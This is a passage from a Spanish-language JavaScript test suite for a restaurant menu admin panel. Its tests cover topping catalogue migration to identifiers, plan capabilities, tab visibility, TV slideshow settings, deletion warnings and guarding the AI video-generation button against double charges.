			assert.equal(conTrabajos(v).trabajoEnCursoDe('p1'), null, `con ${JSON.stringify(v)}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('catalogoDe · el catálogo de toppings, en una sola forma', () => {
	// Espejo de catalogoDe() en core/carrito.js del menú público. El catálogo
	// se ha guardado de tres maneras: cadenas sueltas, objeto con precio y
	// objeto con identificador. Las tres tienen que dar lo mismo, o el panel y
	// la carta enseñarían cosas distintas.
	const crudo = () => cargar('index.html', 'function catalogoDe',
		'// ── PERSONALIZACIÓN DEL PLATO', {}).catalogoDe;
	// El vm corre en otro realm: lo que crea allí no comparte prototipos con lo
	// de aquí y deepEqual estricto lo rechaza aunque la forma coincida.
	const normalizar = attr => JSON.parse(JSON.stringify(crudo()(attr)));

	test('una cadena suelta usa su nombre como identificador', () => {
		// Es la pieza que sostiene la migración: sin ella, un plato guardado con
		// nombres y un catálogo ya migrado no se encontrarían nunca.
		const c = normalizar({ toppings_platino: ['Queso'], salsas: ['BBQ'] });
		assert.deepEqual(c.platino, [{ id: 'Queso', nombre: 'Queso' }]);
		assert.deepEqual(c.salsas,  [{ id: 'BBQ', nombre: 'BBQ' }]);
	});

	test('con identificador, manda el identificador', () => {
		const c = normalizar({ toppings_premium: [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }] });
		assert.deepEqual(c.premium, [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }]);
	});

	test('un premium sin precio vale cero, no NaN', () => {
		assert.equal(normalizar({ toppings_premium: [{ nombre: 'X', precio: 'abc' }] }).premium[0].precio, 0);
	});

	test('la basura se cae en vez de pintarse', () => {
		// atributos es JSON libre: lo que entre raro no puede acabar como un
		// chip vacío en la pestaña.
		const c = normalizar({ toppings_platino: ['', null, '  ', 'Queso'], salsas: 'no soy lista' });
		assert.deepEqual(c.platino.map(t => t.nombre), ['Queso']);
		assert.deepEqual(c.salsas, []);
	});

	test('sin catálogo devuelve las tres listas vacías', () => {
		assert.deepEqual(normalizar({}),   { platino: [], premium: [], salsas: [] });
		assert.deepEqual(normalizar(null), { platino: [], premium: [], salsas: [] });
	});
});

// ═══════════════════════════════════════════════════════════════
describe('personalizacionDe · qué toppings ofrece un plato', () => {
	// Devuelve siempre IDENTIFICADORES del catálogo de hoy, venga el plato de
	// la época que venga. Traducir aquí es lo que migra los datos solos: en
	// cuanto el restaurante guarde la ficha, lo que se escribe ya son ids.
	const ctx = () => cargar('index.html', [
		['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
		['function personalizacionDe', 'function renderPersonalizacion'],
	], {});
	const traducir = (p, attr) => {
		const c = ctx();
		return JSON.parse(JSON.stringify(c.personalizacionDe(p, c.catalogoDe(attr))));
	};

	const CATALOGO = {
		toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla' }, { id: 't_tom', nombre: 'Tomate' }],
		toppings_premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 4000 }],
		salsas:           [{ id: 't_bbq', nombre: 'BBQ' }],
	};

	test('un plato ya migrado se lee tal cual', () => {
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('un plato guardado con NOMBRES se traduce a identificadores', () => {
		// La ventana de la migración: el catálogo ya tiene ids y el plato
		// todavía no. Se encuentran igual, y al guardar la ficha queda migrado.
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['Cebolla'], premium: ['Tocineta'], salsas: ['BBQ'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('RENOMBRAR un topping ya no desengancha el plato', () => {
		// El motivo entero de que exista el identificador.
		const renombrado = { ...CATALOGO, toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla caramelizada' }] };
		assert.deepEqual(traducir({ atributos: { personalizacion: { platino: ['t_ceb'] } } }, renombrado).platino,
			['t_ceb'], 'sigue marcado');
	});

	test('lo que ya no está en el catálogo se cae', () => {
		const r = traducir({ atributos: { personalizacion: { platino: ['t_ceb', 't_borrado'] } } }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb']);
	});

	test('de la copia vieja se sale por el nombre', () => {
		// Los tres productos originales llevaban una copia del catálogo dentro.
		// El precio deja de viajar con el plato: pasa a salir siempre del
		// catálogo del negocio, que es lo que arregla el fallo.
		const r = traducir({ atributos: {
			toppings_platino: ['Cebolla', 'Tomate'],
			toppings_premium: [{ nombre: 'Tocineta', precio: 9000 }],
			salsas: ['BBQ'],
		} }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb', 't_tom']);
		assert.deepEqual(r.premium, ['t_toc'], 'sin el precio dentro');
		assert.deepEqual(r.salsas,  ['t_bbq']);
	});

	test('un plato nuevo empieza vacío', () => {
		assert.deepEqual(traducir({ atributos: {} }, CATALOGO),
			{ platino: [], premium: [], salsas: [] });
	});

	test('no se queda con referencias a los arreglos del producto', () => {
		// Si compartiera el arreglo, marcar un chip modificaría el producto en
		// memoria y "cambios sin guardar" no vería nada que comparar.
		const c = ctx();
		const p = { atributos: { personalizacion: { platino: ['t_ceb'], premium: [], salsas: [] } } };
		c.personalizacionDe(p, c.catalogoDe(CATALOGO)).platino.push('t_tom');
		assert.deepEqual(p.atributos.personalizacion.platino, ['t_ceb'], 'el producto no se toca');
	});

	test('una copia vieja con entradas rotas no las arrastra', () => {
		const r = traducir({ atributos: {
			toppings_premium: [{ nombre: 'Tocineta', precio: 4000 }, { precio: 1000 }, null],
		} }, CATALOGO);
		assert.deepEqual(r.premium, ['t_toc']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('tabla de planes del panel', () => {
	// Es un espejo de core/planes.js del menú público: dos aplicaciones
	// desplegadas por separado que deben decir lo mismo. Si divergen, el
	// panel ofrece algo que la carta no pinta, o al revés.
	//
	// Se entra por planDe y no por PLANES a propósito: un 'const' no se
	// engancha al contexto del vm —solo las declaraciones de función—, y de
	// paso se prueba el accesor que usa el panel de verdad.
	const { planDe } = cargar('index.html', 'const PLANES = {', 'function planActual');
	const PLANES_NOMBRES = ['vitrina', 'pedidos', 'completo', 'video'];
	const plan = nombre => planDe({ atributos: { plan: nombre } });

	test('todos los planes declaran todas las capacidades', () => {
		// Una bandera que falta se lee como undefined, o sea como "no", y un
		// plan pierde algo sin que nadie lo haya decidido.
		const banderas = ['marca', 'qr_disenador', 'estadisticas', 'horarios', 'videos', 'carrito'];
		for (const nombre of PLANES_NOMBRES)
			for (const b of banderas)
				assert.equal(typeof plan(nombre)[b], 'boolean', `${nombre} no declara "${b}"`);
	});

	test('el carrito es capacidad de plan, no solo modelo de página', () => {
		assert.equal(plan('vitrina').carrito, false, 'vitrina es solo escaparate');
		assert.equal(plan('pedidos').carrito, true);
		assert.equal(plan('completo').carrito, true);
		assert.equal(plan('video').carrito, true);
	});

	test('el modelo de video solo lo lista el plan de video', () => {
		for (const n of ['vitrina', 'pedidos', 'completo'])
			assert.equal(plan(n).modelos.includes('video'), false, `${n} no debería`);
		assert.ok(plan('video').modelos.includes('video'));
	});

	test('un plan desconocido no deja al restaurante sin nada', () => {
		// Un valor mal escrito en la base no puede apagarle el panel a nadie.
		assert.equal(typeof plan('platino_ultra').carrito, 'boolean');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('navElegido · guardar Apariencia no puede dejar sin modelo', () => {
	// Un <select> al que se le asigna un valor que no está entre sus opciones
	// se queda con "". Y "" en nav lo lee loader.js como falso y cae a topnav:
	// una carta en video se convertía en carta de fotos al pulsar Guardar.
	const elegir = (valorDelSelect, navGuardado) => {
		const ctx = cargar('index.html', 'function navElegido', '// Aplica las restricciones', {
			state: { restaurante: { atributos: navGuardado === undefined ? {} : { nav: navGuardado } } },
			document: { getElementById: () => ({ value: valorDelSelect }) },
		});
		return ctx.navElegido();
	};

	test('se guarda lo que elige el usuario', () => {
		assert.equal(elegir('sidebar', 'topnav'), 'sidebar');
		assert.equal(elegir('video', 'topnav'), 'video');
	});

	test('un desplegable sin la opción no borra el modelo', () => {
		// El caso exacto que rompió Voro.
		assert.equal(elegir('', 'video'), 'video');
	});

	test('sin nada de dónde tirar, topnav', () => {
		// topnav es el modelo por defecto del menú público: es la respuesta
		// segura, no una elección.
		assert.equal(elegir('', undefined), 'topnav');
	});

	test('nunca devuelve cadena vacía', () => {
		for (const [sel, guardado] of [['', ''], ['', null], ['', undefined], ['', 'carrito']])
			assert.notEqual(elegir(sel, guardado), '', `con ${JSON.stringify([sel, guardado])}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarPestanasAlModelo · donde hay carrito hay Pedidos', () => {
	// La pestaña Pedidos es donde se pone el WhatsApp al que llegan los
	// pedidos. Sin ella el cliente arma el suyo y no llega a ningún sitio,
	// sin ninguna pista de que falta configurar algo.
	const conAtributos = (atributos, plan = { carrito: true }) => {
		const mapa = {
			tabBtnToppings: { style: {} },
			tabBtnPedidos:  { style: {} },
			tabBtnTv:       { style: {} },
		};
		const ctx = cargar('index.html', 'function ajustarPestanasAlModelo',
			'// Qué modelo se guarda', {
				state: { restaurante: { atributos } },
				planActual: () => plan,
				document: { getElementById: id => mapa[id] },
				renderPedidos() {}, renderMetodosPago() {},
			});
		ctx.ajustarPestanasAlModelo();
		return {
			pedidos:  mapa.tabBtnPedidos.style.display,
			toppings: mapa.tabBtnToppings.style.display,
			tv:       mapa.tabBtnTv.style.display,
		};
	};

	test('el modelo carrito siempre las tiene', () => {
		assert.equal(conAtributos({ nav: 'carrito' }).pedidos, 'block');
	});

	test('el modelo video con el carrito encendido también', () => {
		// Es lo que faltaba: se encendía el carrito en video y no había dónde
		// poner el número.
		assert.equal(conAtributos({ nav: 'video', carrito: true }).pedidos, 'block');
	});

	test('el modelo video sin carrito no las enseña', () => {
		assert.equal(conAtributos({ nav: 'video', carrito: false }).pedidos, 'none');
	});

	test('sin el plan no se enseñan aunque el interruptor esté puesto', () => {
		// El interruptor puede quedar encendido de un plan anterior. Manda el
		// plan de hoy, igual que en la carta.
		assert.equal(conAtributos({ nav: 'video', carrito: true }, { carrito: false }).pedidos, 'none');
	});

	test('la pestaña de TV solo sale con el plan que la incluye', () => {
		// La cartelera es de pago. Esconder la pestaña no es la protección
		// —el servidor filtra la clave 'tv' por plan— pero enseñarla a quien
		// no la tiene contratada es ofrecerle algo que no va a poder guardar.
		assert.equal(conAtributos({}, { carrito: true, tv: false }).tv, 'none');
		assert.equal(conAtributos({}, { carrito: true, tv: true }).tv, 'block');
	});

	test('si ya está configurada, la pestaña sigue saliendo sin el plan', () => {
		// Un cambio de plan no puede dejar una pantalla encendida en la pared
		// de un local sin ninguna forma de apagarla desde el panel.
		assert.equal(conAtributos({ tv: { activa: true } }, { carrito: true, tv: false }).tv, 'block');
	});

	test('un restaurante con toppings de antes conserva su pestaña', () => {
		// Aunque ya no tenga carrito: son datos suyos y debe poder verlos.
		const r = conAtributos({ nav: 'topnav', salsas: ['BBQ'] }, { carrito: false });
		assert.equal(r.toppings, 'block');
		assert.equal(r.pedidos, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Pantalla TV · qué se guarda y qué se avisa', () => {
	// La cartelera vive en atributos.tv y la lee tv.html. Que esa clave exista
	// es lo único que la enciende, así que lo que se guarde aquí es lo que va a
	// estar puesto en la pared de un restaurante durante todo un servicio.
	const montar = (opciones = {}) => {
		const campos = {
			tvActiva:      { checked: opciones.activa !== false },
			tvModo:        { value: opciones.modo || 'todos' },
			tvCategoria:   { value: opciones.categoria || 'c1' },
			tvPorSlide:    { value: String(opciones.porSlide || 2) },
			tvSegundos:    { value: String(opciones.segundos ?? 8) },
			tvOrientacion: { value: opciones.orientacion || 'horizontal' },
			tvAleatorio:   { checked: !!opciones.aleatorio },
			tvResumen:     { textContent: '', style: {} },
			tvAvisoTamano: { textContent: '', style: {} },
			tvStatus:      { textContent: '', style: {} },
			tvCategoriaWrap: { style: {} }, tvManualWrap: { style: {} },
			tvCuerpo: { style: {} }, tvAjustes: { style: {} },
			tvPlatos: { innerHTML: '', appendChild() {} },
			tvEnlace: { value: '' },
		};
		const enviado = [];
		const avisos = [];
		const ctx = cargar('index.html', [
			['const TV_POR_DEFECTO', '// ── PEDIDOS (WhatsApp'],
		], {
			state: {
				restaurante: { id: 'r1', slug: 'bonzas', atributos: { tv: opciones.guardado || {} } },
				categorias: [{ id: 'c1', nombre: 'Hamburguesas' }, { id: 'c2', nombre: 'Bebidas' }],
				productos: opciones.productos || [
					{ id: 'p1', nombre: 'Burger', disponible: true,  imagen_url: 'https://x/1.jpg', categoria_id: 'c1' },
					{ id: 'p2', nombre: 'Perro',  disponible: true,  imagen_url: 'https://x/2.jpg', categoria_id: 'c1' },
					{ id: 'p3', nombre: 'Agua',   disponible: true,  imagen_url: '',               categoria_id: 'c2' },
					{ id: 'p4', nombre: 'Agotado',disponible: false, imagen_url: 'https://x/4.jpg', categoria_id: 'c1' },
				],
			},
			document: { getElementById: id => campos[id], createElement: () => ({ style: {}, onclick: null }) },
			urlPublica: () => 'https://menu.vmenus.co/bonzas',
			apiFetch: async (m, r, cuerpo) => { enviado.push(cuerpo); return { id: 'r1', atributos: {} }; },
			showToast: (m, t) => avisos.push([t, m]),
			navigator: { clipboard: { writeText: async () => {} } },
			Math, parseInt, Array, String, JSON,
		});
		return { ctx, campos, enviado, avisos, tvSeleccion: opciones.seleccion || [] };
	};

	test('solo cuenta platos disponibles Y con foto', () => {
		// Sin foto no hay slide, así que ofrecerlos sería una trampa: el
		// restaurante los marca y luego no salen en la pantalla.
		const { ctx } = montar();
		assert.equal(ctx.tvPlatosPosibles().length, 2, 'de cuatro, dos sirven');
	});

	test('avisa cuando la selección no mostraría ningún plato', () => {
		// El caso "puse la tele y solo sale mi logo". Vale más decirlo al
		// guardar que dejar que lo descubra con los clientes delante.
		const { ctx, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /no mostraría ningún plato/);
	});

	test('el resumen dice cuánto dura la vuelta completa', () => {
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, segundos: 30 });
		ctx.tvPintarResumen();
		// 2 platos, 1 por pantalla, 30 s => 1 minuto justo.
		assert.match(campos.tvResumen.textContent, /2 platos/);
		assert.match(campos.tvResumen.textContent, /1 min/);
	});

	test('un plato por pantalla avisa de la resolución de las fotos', () => {
		// Se guardan a 800 px: repartidas entre dos sobran, ocupando un
		// televisor entero se nota.
		const { ctx, campos } = montar({ porSlide: 1 });
		ctx.tvAvisoTamano();
		assert.equal(campos.tvAvisoTamano.style.display, 'block');
		assert.match(campos.tvAvisoTamano.textContent, /borrosa/);

		const b = montar({ porSlide: 3 });
		b.ctx.tvAvisoTamano();
		assert.equal(b.campos.tvAvisoTamano.style.display, 'none');
	});

	test('guardar manda SOLO la clave tv', async () => {
		// atributos lo comparten ocho pantallas. Mandar el objeto entero desde
		// la copia que el panel cargó al entrar es el fallo de §9.10.
		const { ctx, enviado } = montar();
		await ctx.saveTV();
		assert.deepEqual(Object.keys(enviado[0]), ['atributos']);
		assert.deepEqual(Object.keys(enviado[0].atributos), ['tv']);
	});

	test('no deja encender una cartelera que no enseñaría nada', async () => {
		const { ctx, enviado, avisos, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se guarda');
		assert.equal(avisos[0][0], 'error');
		assert.match(campos.tvStatus.textContent, /Revisa/);
	});

	test('apagada sí se puede guardar aunque no haya platos', async () => {
		// Apagarla es justo lo que hace falta poder hacer cuando algo va mal.
		const { ctx, enviado } = montar({ activa: false, modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 1);
		assert.equal(enviado[0].atributos.tv.activa, false);
	});

	test('los segundos se acotan antes de guardar, no en la pantalla', async () => {
		// Con 1 segundo la pantalla parpadea. tv.html también lo acota, pero
		// guardar un valor imposible deja al restaurante viendo un número que
		// no es el que se aplica.
		const { ctx, enviado } = montar({ segundos: 1 });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.segundos, 4);

		const b = montar({ segundos: 9999 });
		await b.ctx.saveTV();
		assert.equal(b.enviado[0].atributos.tv.segundos, 60);
	});

	test('la categoría no se guarda si el modo no es por categoría', async () => {
		// Dejar el identificador puesto en modo 'todos' es la ambigüedad que
		// tenía el requerimiento original: dos campos diciendo qué mostrar.
		const { ctx, enviado } = montar({ modo: 'todos', categoria: 'c1' });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.categoria_id, null);
		// .length y no deepEqual con []: el arreglo se construye dentro de la
		// VM, así que su prototipo no es el de aquí y la comparación estricta
		// falla por el prototipo, no por el contenido.
		assert.equal(enviado[0].atributos.tv.productos.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmDelete · borrar una categoría se lleva sus platos', () => {
	// productos.categoria_id es ON DELETE CASCADE: la categoría se lleva por
	// delante todos sus platos, con sus fotos y sus videos. El aviso decía
	// solo "¿seguro que quieres eliminar Entrantes?", y nadie que lea eso
	// espera perder doce platos.
	const borrar = (tipo, id, productos) => {
		const mapa = {
			confirmName:     { textContent: '' },
			confirmArrastre: { textContent: '', style: {} },
		};
		const ctx = cargar('index.html', 'function confirmDelete', 'async function executeDelete', {
			state: { productos, deleteAction: null },
			document: { getElementById: id => mapa[id] },
			openModal() {},
		});
		ctx.confirmDelete(tipo, id, 'Entrantes');
		return mapa.confirmArrastre;
	};

	const P = (id, cat) => ({ id, categoria_id: cat });

	test('avisa de cuántos platos se van con ella', () => {
		const a = borrar('categoria', 'c1', [P('p1','c1'), P('p2','c1'), P('p3','c2')]);
		assert.equal(a.style.display, 'block');
		assert.match(a.textContent, /los 2 platos/);
	});

	test('con un solo plato lo dice en singular', () => {
		// "los 1 platos" es la clase de detalle que hace que un aviso se lea
		// como generado por una máquina y se ignore.
		assert.match(borrar('categoria', 'c1', [P('p1','c1')]).textContent, /el plato que hay dentro/);
	});

	test('una categoría vacía no asusta con nada', () => {
		assert.equal(borrar('categoria', 'c1', [P('p1','c2')]).style.display, 'none');
	});

	test('borrar un producto no arrastra nada', () => {
		assert.equal(borrar('producto', 'p1', [P('p1','c1'), P('p2','c1')]).style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('etiquetaModelo · todos los modelos tienen nombre', () => {
	// Un modelo listado en PLANES y sin etiqueta salía como "undefined" en el
	// resumen del plan. Pasó con 'video': se añadió a los planes y no a la
	// tabla de etiquetas.
	//
	// Se comprueba que la etiqueta no sea el identificador crudo. Los ids van
	// en minúscula y las etiquetas capitalizadas, así que si coinciden es que
	// no hay etiqueta y está devolviendo el respaldo.
	const ctx = cargar('index.html', 'const PLANES = {', 'function renderPlanResumen');

	test('ningún modelo de ningún plan se queda sin etiqueta', () => {
		const modelos = new Set();
		for (const n of ['vitrina', 'pedidos', 'completo', 'video'])
			ctx.planDe({ atributos: { plan: n } }).modelos.forEach(m => modelos.add(m));

		assert.ok(modelos.size >= 5, 'deberían salir los cinco modelos');
		for (const m of modelos)
			assert.notEqual(ctx.etiquetaModelo(m), m, `el modelo "${m}" no tiene etiqueta`);
	});

	test('un modelo desconocido no imprime "undefined"', () => {
		// Si algún día hay un modelo nuevo sin etiqueta, que se lea su nombre
		// interno y no una palabra que no significa nada.
		assert.equal(ctx.etiquetaModelo('loquesea'), 'loquesea');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoFallidoDe · un video que falló tiene que verse', () => {
	// Un trabajo que muere mientras nadie mira la ficha no aparecía en ningún
	// sitio: el plato se quedaba sin video y sin explicación, y volver a
	// subirlo daba exactamente el mismo error.
	const buscar = (trabajos, productoId = 'p1') => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: { trabajosVideo: trabajos } });
		return ctx.trabajoFallidoDe(productoId);
	};
	const T = (id, producto_id, estado, creado_en, error = 'algo') =>
		({ id, producto_id, estado, creado_en, error });

	test('encuentra el fallido de ese plato', () => {
		assert.equal(buscar([T('t1', 'p1', 'error', '2026-08-19')]).id, 't1');
	});

	test('no confunde el de otro plato', () => {
		assert.equal(buscar([T('t1', 'p2', 'error', '2026-08-19')]), null);
	});

	test('los que terminaron bien no son un fallo', () => {
		assert.equal(buscar([T('t1', 'p1', 'listo', '2026-08-19')]), null);
	});

	test('uno en marcha todavía no ha fallado', () => {
		// 'pendiente' y 'procesando' no son un error: el worker aún puede
		// sacarlo adelante y avisar de un fallo que no existe asusta en balde.
		assert.equal(buscar([T('t1', 'p1', 'pendiente', '2026-08-19')]), null);
		assert.equal(buscar([T('t2', 'p1', 'procesando', '2026-08-19')]), null);
	});

	test('con varios fallidos manda el más reciente', () => {
		// El motivo del último es el que explica por qué el plato sigue sin
		// video; el de hace tres días puede ser de otro archivo distinto.
		const r = buscar([
			T('viejo', 'p1', 'error', '2026-08-15', 'formato raro'),
			T('nuevo', 'p1', 'error', '2026-08-19', 'dura 1,4 s'),
		]);
		assert.equal(r.id, 'nuevo');
		assert.match(r.error, /1,4 s/);
	});

	test('sin trabajos cargados no revienta', () => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: {} });
		assert.equal(ctx.trabajoFallidoDe('p1'), null);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('estilo del carrete · aspecto sin tocar el funcionamiento', () => {
	// Tres aspectos del mismo modelo vertical. No son plantillas distintas:
	// todo lo que los separa es CSS. Aquí se comprueba lo único que decide el
	// panel — cuándo se ofrece la elección y qué se guarda.
	const conModelo = (nav, estiloSelect, estiloGuardado) => {
		const mapa = {
			apEstiloFila: { style: {} },
			apNavModelo:  { value: nav ?? '' },
			apEstilo:     { value: estiloSelect ?? '' },
		};
		const ctx = cargar('index.html', [
			['function navElegido', 'function aplicarPlanAlPanel'],
		], {
			state: { restaurante: { atributos: { nav, estilo: estiloGuardado } } },
			document: { getElementById: id => mapa[id] },
		});
		return { ctx, mapa };
	};

	test('el estilo solo se ofrece en el modelo vertical', () => {
		// Un control que no hace nada es peor que no tenerlo: quien lo usa cree
		// que está trabajando.
		const { ctx, mapa } = conModelo('vertical');
		ctx.ajustarEstiloAlModelo();
		assert.equal(mapa.apEstiloFila.style.display, 'block');
	});

	test('en los demás modelos ni aparece', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar', 'video']) {
			const { ctx, mapa } = conModelo(nav);
			ctx.ajustarEstiloAlModelo();
			assert.equal(mapa.apEstiloFila.style.display, 'none', `en ${nav}`);
		}
	});

	test('sin elegir nada se guarda el clásico', () => {
		const { ctx } = conModelo('vertical', '', undefined);
		assert.equal(ctx.estiloElegido(), 'clasico');
	});

	test('un desplegable vacío conserva lo que ya tenía', () => {
		// Mismo fallo que costó una carta en video: a un <select> se le asigna
		// un valor que no está entre sus opciones y se queda en cadena vacía.
		// Guardar eso le borraría el estilo a un restaurante que no lo tocó.
		const { ctx } = conModelo('vertical', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});

	test('lo elegido manda sobre lo guardado', () => {
		const { ctx } = conModelo('vertical', 'intenso', 'clasico');
		assert.equal(ctx.estiloElegido(), 'intenso');
	});

	test('el estilo se conserva al pasar por otro modelo', () => {
		// Se guarda siempre, también donde no se usa. Si se borrara al cambiar
		// de modelo, quien pruebe otro y vuelva se encontraría su elección
		// perdida sin haberla tocado.
		const { ctx } = conModelo('topnav', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('refrescarCupoIA · no puede pisar ni reencender lo que otro apagó', () => {
	// Estas pruebas existen por un fallo que costó dinero de verdad. El
	// 26/08/2026 un mismo plato se generó DOS veces con 21 segundos de
	// diferencia, y las dos causas estaban aquí:
	//
	//   1. Esta función escribía el aviso de proporción en 'iaEstado', el mismo
	//      elemento donde generarConIA acababa de poner "✨ Generando...". Y se
	//      llama justo después, así que el mensaje bueno desaparecía y en su
	//      sitio quedaba un aviso naranja que se lee como un rechazo.
	//   2. Encendía el botón sin mirar, deshaciendo el apagado que generarConIA
	//      acababa de hacer.
	//
	// Juntas: parece que no salió, y el botón invita a volver a pulsar.

	const pantalla = () => {
		const mapa = {};
		for (const id of ['iaCupo', 'btnGenerarIA', 'iaEncaje', 'iaEstado', 'editProductId'])
			mapa[id] = { style: {}, textContent: '', value: '', disabled: false };
		mapa.editProductId.value = 'p1';
		return mapa;
	};

	const correr = (mapa, { cupo = { disponibles: 20, cupo: 24 }, encaje = null,
	                        generandoIA = null, porAprobar = null, enCurso = null } = {}) => {
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => cupo,
			state: { restaurante: { id: 'r1' }, generandoIA },
			document: { getElementById: id => mapa[id] },
			encajeDeLaFotoActual: () => encaje,
			// Vive en otro trozo del archivo; aquí solo importa que no estorbe.
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => porAprobar,
			trabajoEnCursoDe: () => enCurso,
		});
		return ctx.refrescarCupoIA();
	};

	test('el aviso de proporción NO toca el elemento del estado', async () => {
		// El fallo exacto: generarConIA deja aquí "✨ Generando..." y esta
		// función lo borraba. Tiene que seguir intacto.
		const m = pantalla();
		m.iaEstado.textContent = '✨ Generando... esto tarda un par de minutos.';

		await correr(m, { encaje: { veredicto: 'avisa', mensaje: 'se recortará el 25%' } });

		assert.equal(m.iaEstado.textContent, '✨ Generando... esto tarda un par de minutos.',
			'el estado de la generación no se toca');
		assert.equal(m.iaEncaje.textContent, 'se recortará el 25%', 'el aviso va en su propio sitio');
	});

	test('con una generación en curso el botón NO se vuelve a encender', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { generandoIA: 'p1' });
		assert.equal(m.btnGenerarIA.disabled, true, 'hay una en camino: pulsar otra vez la paga dos veces');
	});

	test('pero solo para el plato que la está generando', async () => {
		// El cupo es del restaurante; generar para OTRO plato es legítimo.
		const m = pantalla();
		await correr(m, { generandoIA: 'otro-plato' });
		assert.equal(m.btnGenerarIA.disabled, false);
	});

	test('con la conversión en marcha tampoco', async () => {
		// Cubre el hueco de después: la generación terminó, el trabajo existe y
		// todavía se está convirtiendo. Y esto sí sobrevive a recargar.
		const m = pantalla();
		await correr(m, { enCurso: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
	});

	test('con uno esperando revisión se apaga y se dice por qué', async () => {
		// Pedir otra es pagar por una decisión que todavía no se ha tomado.
		const m = pantalla();
		await correr(m, { porAprobar: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaEncaje.textContent, /Publícalo o descártalo/);
	});

	test('una foto que no sirve apaga el botón', async () => {
		const m = pantalla();
		await correr(m, { encaje: { veredicto: 'rechaza', mensaje: 'sube una foto vertical' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.equal(m.iaEncaje.textContent, 'sube una foto vertical');
	});

	test('sin nada que lo impida, el botón queda vivo y sin avisos', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, false);
		assert.equal(m.iaEncaje.textContent, '');
		assert.match(m.iaCupo.textContent, /quedan 20 de 24/);
	});

	test('sin cupo se apaga, pase lo que pase con la foto', async () => {
		const m = pantalla();
		await correr(m, { cupo: { disponibles: 0, cupo: 24 }, encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaCupo.textContent, /sin animaciones/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('toppingsHuerfanos · qué platos se quedan colgados al borrar', () => {
	// Desde que los platos guardan el identificador, esto solo puede pasar al
	// BORRAR un elemento del catálogo: renombrarlo ya no los desengancha. Sigue
	// comparando también por nombre porque un plato que nadie haya vuelto a
	// guardar desde la migración todavía puede llevar nombres dentro.
	const buscar = (toppingState, productos) => cargar('index.html',
		[['function toppingsHuerfanos', 'async function saveToppings']],
		{ toppingState, state: { productos } }).toppingsHuerfanos();

	const catalogo = {
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [{ id: 't_bbq', nombre: 'BBQ' }],
	};
	const plato = nombre => ({
		nombre, atributos: { personalizacion: { platino: ['t_que'], premium: ['t_toc'], salsas: ['t_bbq'] } },
	});

	test('con el catálogo intacto no avisa de nada', () => {
		// .length y no deepEqual con []: lo que devuelve la función se
		// construye dentro de la VM, así que su Array.prototype no es el de
		// aquí y la comparación estricta falla por el prototipo, no por el
		// contenido.
		assert.equal(buscar(catalogo, [plato('Hamburguesa')]).length, 0);
	});

	test('RENOMBRAR ya no delata a nadie, que es el cambio', () => {
		// Antes esto avisaba de los dos platos y había que volver a marcarlos a
		// mano en cada ficha. El identificador no cambia, así que no se pierde
		// nada y no hay nada que avisar.
		const renombrado = { ...catalogo, premium: [{ id: 't_toc', nombre: 'Tocineta ahumada', precio: 3000 }] };
		assert.equal(buscar(renombrado, [plato('Hamburguesa'), plato('Perro')]).length, 0);
	});

	test('borrar uno sí delata los platos que lo ofrecían', () => {
		const avisos = buscar({ ...catalogo, salsas: [] }, [plato('Hamburguesa'), plato('Perro')]);
		assert.equal(avisos.length, 2, 'los dos platos lo ofrecían');
		assert.match(avisos[0], /Hamburguesa/);
		assert.match(avisos[0], /t_bbq/);
	});

	test('un plato sin migrar, guardado por nombre, también cuenta', () => {
